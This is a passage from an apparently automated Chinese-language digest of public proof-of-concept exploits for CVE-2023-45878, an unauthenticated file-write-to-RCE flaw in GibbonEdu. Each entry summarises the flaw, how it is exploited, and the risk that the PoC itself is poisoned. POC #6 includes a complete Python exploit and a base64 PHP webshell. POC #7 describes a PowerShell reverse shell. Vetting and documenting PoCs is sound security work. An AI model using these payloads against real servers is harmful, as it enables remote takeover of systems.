*   **依赖风险：** 代码依赖`requests`库，如果`requests`库本身被投毒，可能影响POC的安全性。
*   **后门风险：** 作者可能在webshell中加入隐蔽的后门代码，例如，记录用户输入的命令或将服务器信息发送到外部服务器，但从当前代码来看，没有明显的后门特征。风险评估为10%。
*   **误用风险：** 该脚本明确声明用于教育目的，但如果被恶意使用者利用，可能造成严重危害。脚本的广泛传播可能增加漏洞被利用的风险。

综合来看，该POC的投毒风险较低，主要风险在于误用和对`requests`库的依赖。

**项目地址:** [ulricvbs/gibbonlms-filewrite_rce](https://github.com/ulricvbs/gibbonlms-filewrite_rce)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---



---

## POC #6

**来源**: [CVE-2023-45878-killercd_CVE-2023-45878.md](../2023/CVE-2023-45878-killercd_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要网络访问，目标系统开启了GibbonEdu服务

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中存在的任意文件写入漏洞。攻击者无需身份验证即可利用该漏洞，通过向`modules/Rubrics/rubrics_visualise_saveAjax.php`发送特制的POST请求，其中`img`参数包含base64编码的恶意PHP代码，`path`参数指定写入的文件名。由于程序没有进行严格的验证，攻击者可以将恶意PHP代码写入Web目录，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。POC代码模拟了攻击过程，通过POST请求向目标URL的`modules/Rubrics/rubrics_visualise_saveAjax.php`发送恶意数据，成功写入PHP文件。

**投毒风险：**
经过对POC代码的分析，未发现明显的投毒代码。该脚本的主要功能是利用漏洞在目标系统上写入一个包含命令执行功能的PHP文件，然后通过GET请求执行命令。没有发现任何作者隐藏的恶意行为，例如反向shell、数据窃取或其他未经授权的操作，因此投毒风险评估为0%。

**利用方式：**
1.  构造包含恶意PHP代码的base64编码字符串，例如用于执行系统命令的代码。
2.  构造POST请求，设置`img`参数为base64编码的恶意PHP代码，`path`参数为期望写入的文件名（通常是PHP后缀）。
3.  发送POST请求到`modules/Rubrics/rubrics_visualise_saveAjax.php`。
4.  如果写入成功，通过GET请求访问写入的PHP文件，并传递`cmd`参数来执行系统命令。

利用示例（基于提供的POC代码）：

```python
import requests
import sys
import random
import argparse
import string


def main():

    payload_file = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    endpoint = "modules/Rubrics/rubrics_visualise_saveAjax.php"
    payload = {
        "img":f"image/png;{payload_file},PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=",
        "path":f"{payload_file}.php",
        "gibbonPersonID":"0000000001"

    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"

    }
    parser = argparse.ArgumentParser(description="GibbonEdu Gibbon version 25.0.1 Arbitrary File Write")
    parser.add_argument("url", type=str, help="Gibbon URL")
    args = parser.parse_args()

  
  
    print("Exploiting ...")
    print(f"{args.url}/{endpoint}")
    p_resp = requests.post(f"{args.url}/{endpoint}", headers=headers, data=payload)
    if p_resp.status_code!=200:
        print("[Err] Exploit failed!")
        sys.exit(-1)
    g_resp = requests.get(f"{args.url}/{payload_file}.php", params={"cmd":"whoami"})
    print(f"Got Webshell {args.url}/{payload_file}.php?cmd=whoami")
    print(g_resp.text)

if __name__ == '__main__':
    main()
```

该POC脚本首先生成一个随机的文件名，然后构造包含恶意PHP代码的payload，将payload发送到目标端点，如果写入成功，则通过GET请求访问写入的PHP文件并执行`whoami`命令，最后输出命令执行的结果。

**项目地址:** [killercd/CVE-2023-45878](https://github.com/killercd/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #7

**来源**: [CVE-2023-45878-nrazv_CVE-2023-45878.md](../2023/CVE-2023-45878-nrazv_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统运行GibbonEdu，且漏洞页面可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中的一个任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`，该文件无需身份验证即可访问。攻击者可以通过POST请求，利用`img`、`path`和`gibbonPersonID`参数，将恶意PHP代码写入服务器上的任意位置。其中`img`参数是base64编码的图像数据，`path`参数指定写入的文件路径，与安装目录的绝对路径连接。攻击者可以利用这个漏洞上传webshell，从而实现远程代码执行。

**有效性：**
提供的POC代码有效。从搜索引擎结果和漏洞库信息来看，该漏洞允许未授权用户写入任意文件，结合POC代码，其利用方式是通过构造特定的POST请求，将包含PHP恶意代码的base64编码数据写入指定的文件路径。POC代码中包含用于生成Windows反向shell的powershell脚本。

**投毒风险：**
POC代码的投毒风险较低，约为10%。主要风险点在于：
1.  **powershell脚本:**POC代码中生成了Windows反向shell的powershell脚本,如果目标环境并非预期，可能会导致攻击者在不知情的情况下连接到恶意服务器。
2.  **文件服务器:**POC运行了一个文件服务器，可能存在其他安全问题，虽然代码里只是用来传输powershell脚本,仍然存在一定风险

**利用方式：**
1.  目标系统运行GibbonEdu 25.0.1或更早版本。
2.  攻击者通过POST请求访问`rubrics_visualise_saveAjax.php`，构造恶意的`img`和`path`参数。
3.  `img`参数包含base64编码的PHP恶意代码，例如`<?php echo system($_GET['cmd']); ?>`，`path`参数指定webshell的文件名，例如`shell.php`。
4.  服务器将解码后的PHP代码写入指定的文件路径，例如`/modules/Rubrics/shell.php`。
5.  攻击者通过访问`/modules/Rubrics/shell.php?cmd=恶意命令`执行任意命令。
6. POC生成一个powershell脚本用于反向连接，并通过建立http服务供目标服务器下载
7.  POC利用webshell执行powershell命令，从http服务下载生成的powershell脚本。

**项目地址:** [nrazv/CVE-2023-45878](https://github.com/nrazv/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #8

**来源**: [CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md](../2023/CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md)

## CVE-2023-45878-GibbonEdu-任意文件写入/RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入/远程代码执行

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** <= 25.0.1

**利用条件:** 需要目标服务器运行存在漏洞的GibbonEdu系统，并能通过HTTP访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及更早版本中存在的任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`文件中，由于此文件没有进行身份验证，攻击者可以通过构造恶意的HTTP POST请求，利用`img`、`path`和`gibbonPersonID`参数，将任意PHP代码写入服务器。攻击者通过设置`path`参数指定文件保存路径，并将包含恶意代码的base64编码内容放在`img`参数中，服务器会将base64解码后的内容写入指定路径，从而实现任意文件写入。写入的PHP文件允许未经身份验证的远程代码执行。

**漏洞利用方式：**
1.  攻击者发送一个POST请求到`/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
2.  在POST请求中，`img`参数包含base64编码的PHP webshell代码，`path`参数指定webshell的文件名，`gibbonPersonID`参数可以设置为任意值。
3.  服务器接收到请求后，将`img`参数中的base64编码数据解码，然后将其写入到通过`path`参数指定的文件中。
4.  攻击者随后可以通过访问webshell文件，执行任意系统命令，从而控制服务器。

**POC代码分析：**
POC代码`gibbonlms_cmd_shell.py`实现了一个简单的交互式命令行shell。它首先上传一个包含`system($_GET['cmd'])`的PHP webshell，然后允许用户通过输入命令与webshell进行交互。如果webshell被删除，脚本会自动重新上传webshell。

**投毒风险分析：**
该POC代码主要功能是利用漏洞上传webshell并提供交互式界面。潜在的投毒风险较低，但是仍存在一些可能性：

*   **依赖风险：** 代码依赖`requests`库，如果`requests`库本身被投毒，可能影响POC的安全性。
*   **后门风险：** 作者可能在webshell中加入隐蔽的后门代码，例如，记录用户输入的命令或将服务器信息发送到外部服务器，但从当前代码来看，没有明显的后门特征。风险评估为10%。
*   **误用风险：** 该脚本明确声明用于教育目的，但如果被恶意使用者利用，可能造成严重危害。脚本的广泛传播可能增加漏洞被利用的风险。

综合来看，该POC的投毒风险较低，主要风险在于误用和对`requests`库的依赖。

**项目地址:** [ulricvbs/gibbonlms-filewrite_rce](https://github.com/ulricvbs/gibbonlms-filewrite_rce)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

